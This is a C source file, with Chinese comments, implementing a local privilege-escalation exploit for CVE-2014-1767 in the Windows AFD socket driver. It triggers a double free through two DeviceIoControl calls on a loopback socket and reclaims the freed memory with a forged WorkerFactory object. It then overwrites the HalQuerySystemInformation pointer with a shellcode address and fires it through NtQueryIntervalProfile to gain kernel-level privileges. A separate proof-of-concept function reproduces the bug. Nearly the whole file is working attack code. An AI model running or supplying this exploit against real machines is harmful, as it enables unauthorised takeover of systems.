#include "CVE-2014-1767.h"

lpfnNtCreateWorkerFactory fnNtCreateWorkerFactory = NULL;
lpfnNtSetInformationWorkerFactory fnNtSetInformationWorkerFactory = NULL;
lpfnNtQueryEaFile fnNtQueryEaFile = NULL;
lpfnNtQueryInformationWorkerFactory fnNtQueryInformationWorkerFactory = NULL;
CONST DWORD FakeObjSize = 0xA0;
DWORD inputBuf1[INPUT_SIZE + 5], inputBuf2[INPUT_SIZE + 5];
BYTE ObjHead[0x28] = { 0x00, 0x00, 0x00, 0x00, 0xa8, 0x00, 0x00, 0x00,   
					   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
					   0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,    
					   0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x08, 0x00,    
					   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
BYTE FakeWorkerFactory[FakeObjSize];
HANDLE hCompletionPort = NULL;
HANDLE hWorkerFactory = NULL;

BOOL Exploit_CVE_2014_1767()
{
	BOOL bRet = TRUE;
	
	
	if (!Init_CVE_2014_1767())
	{
		bRet = FALSE;
		goto exit;
	}

	SOCKET s = GetSocket();
	if (s == INVALID_SOCKET)
	{
		bRet = FALSE;
		goto exit;
	}

	if (!Trigger_CVE_2014_1767((HANDLE)s))
	{
		bRet = FALSE;
		goto exit;
	}
	
exit:
	return bRet;
}

BOOL Trigger_CVE_2014_1767(HANDLE hDevice)
{
	BOOL bRet = TRUE;

	PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();

	if (!pHalQuerySystemInformation)
	{
		bRet = FALSE;
		goto exit;
	}

	// 第一次通信，释放内存
	DeviceIoControl(hDevice, 0x1207F, inputBuf1, 0x30, NULL, 0, NULL, NULL);

	// 创建WorkerFactory对象占有释放的内存
	NTSTATUS status = fnNtCreateWorkerFactory(&hWorkerFactory, 
											  GENERIC_ALL,
		                                      NULL, 
		                                      hCompletionPort,
		                                      (HANDLE)-1,
		                                      NULL, NULL, 0, 0, 0);
	if (!NT_SUCCESS(status))
	{
		ShowError("fnNtCreateWorkerFactory", status);
		bRet = FALSE;
		goto exit;
	}

	// 第二次通信释放WorkerFactory对象占有的内存
	DeviceIoControl(hDevice, 0x120C3, inputBuf2, 0x10, NULL, 0, NULL, NULL);

	BYTE bBuf[0x14] = { 0 };

	// *Object = bBuf
	*(PDWORD)((ULONG)FakeWorkerFactory + 0x28) = (DWORD)bBuf;
	// *(PDWORD)(*Object + 0x10) = pHalQuerySystemInformation - 0x1C
	*(PDWORD)(bBuf + 0x10) = (DWORD)pHalQuerySystemInformation - 0x1C;

	IO_STATUS_BLOCK IoStatus;
	
	// 调用函数将构造的FakeWorkerFactory复制到释放的WorkerFactory对象占有的内存
	fnNtQueryEaFile(INVALID_HANDLE_VALUE, &IoStatus, NULL, 0, FALSE, FakeWorkerFactory, FakeObjSize - 0x4, NULL, FALSE);

	// 调用函数让*(_DWORD *)(*(_DWORD *)(*Object + 0x10) + 0x1C) = value执行
	PVOID pTarget = ShellCode;
	fnNtSetInformationWorkerFactory(hWorkerFactory, 8, &pTarget, sizeof(PVOID));

	// 调用函数实现提权
	if (!CallNtQueryIntervalProfile())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

SOCKET GetSocket()
{
	BOOL bRet = TRUE;
	WSADATA WSAData;
	SOCKET s = INVALID_SOCKET;
	SOCKADDR_IN sa;
	int ierr;

	if (WSAStartup(0x2, &WSAData) != 0)
	{
		ShowError("WSAStartup", WSAGetLastError());
		goto exit;
	}

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET)
	{
		ShowError("socket", WSAGetLastError());
		goto exit;
	}

	memset(&sa, 0, sizeof(sa));
	sa.sin_port = htons(135);
	sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	sa.sin_family = AF_INET;
	ierr = connect(s, (const struct sockaddr*)&sa, sizeof(sa));
	if (ierr == SOCKET_ERROR)
	{
		ShowError("connect", WSAGetLastError());
		goto exit;
	}

exit:
	return s;
}

BOOL Init_CVE_2014_1767()
{
	BOOL bRet = TRUE;
	HMODULE hDll = NULL;

	// 加载要调用的函数
	hDll = LoadLibrary("ntdll.dll");
	if (!hDll)
	{
		ShowError("LoadLibrary", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	fnNtCreateWorkerFactory = (lpfnNtCreateWorkerFactory)GetProcAddress(hDll, "ZwCreateWorkerFactory");
	fnNtQueryEaFile = (lpfnNtQueryEaFile)GetProcAddress(hDll, "ZwQueryEaFile");
	fnNtSetInformationWorkerFactory = (lpfnNtSetInformationWorkerFactory)GetProcAddress(hDll, "ZwSetInformationWorkerFactory");
	if (!fnNtCreateWorkerFactory || !fnNtQueryEaFile || !fnNtSetInformationWorkerFactory)
	{
		ShowError("GetProcAddress", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 初始化两次通信用到的输入数据
	DWORD virtualAddress = 0x13371337;
	DWORD length = ((FakeObjSize - 0x1C) / 4 - (virtualAddress % 4 ? 1 : 0)) * 0x1000;

	memset(inputBuf1, 0, INPUT_SIZE * sizeof(DWORD));
	inputBuf1[6] = virtualAddress;
	inputBuf1[7] = length;
	inputBuf1[0xA] = 1;

	memset(inputBuf2, 0, INPUT_SIZE * sizeof(DWORD));
	inputBuf2[0] = 1;
	inputBuf2[1] = 0x0AAAAAAA;

	// 构造WorkerFactory的头部分
	memset(FakeWorkerFactory, 0, FakeObjSize);
	memcpy(FakeWorkerFactory, ObjHead, 0x28);

	// 用于创建WorkerFactory
	hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 1337, 4);
	if (!hCompletionPort)
	{
		ShowError("CreateIoCompletionPort", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

void POC_CVE_2014_1767()
{
	WSADATA WSAData;
	SOCKET s;
	SOCKADDR_IN sa;
	int ierr;

	// 初始化通信的设备句柄
	WSAStartup(0x2, &WSAData);
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	memset(&sa, 0, sizeof(sa));
	sa.sin_port = htons(135);
	sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	sa.sin_family = AF_INET;
	ierr = connect(s, (const struct sockaddr*)&sa, sizeof(sa));

	char outBuf[100];
	DWORD bytesRet;
	
	DWORD targetSize = 0x310;
	DWORD virtualAddress = 0x13371337;
	DWORD mdlSize = (0x4000 * (targetSize - 0x30) / 8) - 0xFFF - (virtualAddress & 0xFFF);
	DWORD inbuf1[100];

	memset(inbuf1, 0, sizeof(inbuf1));
	inbuf1[6] = virtualAddress;
	inbuf1[7] = mdlSize;
	inbuf1[10] = 1;

	// 第一次通信
	DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0x30, outBuf, 0, &bytesRet, NULL);

	DWORD inbuf2[100];
	memset(inbuf2, 0, sizeof(inbuf2));
	inbuf2[0] = 1;
	inbuf2[1] = 0x0AAAAAAA;
	// 第二次通信
	DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0x18, outBuf, 0, &bytesRet, NULL);
}